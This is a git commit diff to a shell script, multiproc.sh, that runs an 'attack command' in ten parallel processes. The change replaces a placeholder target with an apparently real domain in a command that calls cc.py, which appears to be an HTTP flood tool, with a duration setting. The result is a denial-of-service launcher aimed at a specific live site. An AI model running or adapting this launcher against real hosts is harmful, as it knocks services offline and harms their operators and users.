5cc14f7f2e791394a25e61056d0206068880dcca
soft2hack94 <120081384+soft2hack94@users.noreply.github.com>
2022-12-08 07:15:30 +0000

    Update multiproc.sh

--- multiproc.sh
+++ multiproc.sh
@@ -6,7 +6,7 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"
+atk_cmd="python3 cc.py -url http://4kpro.co -v 4 -s 60"
 
 #number of process that you want
 process=10
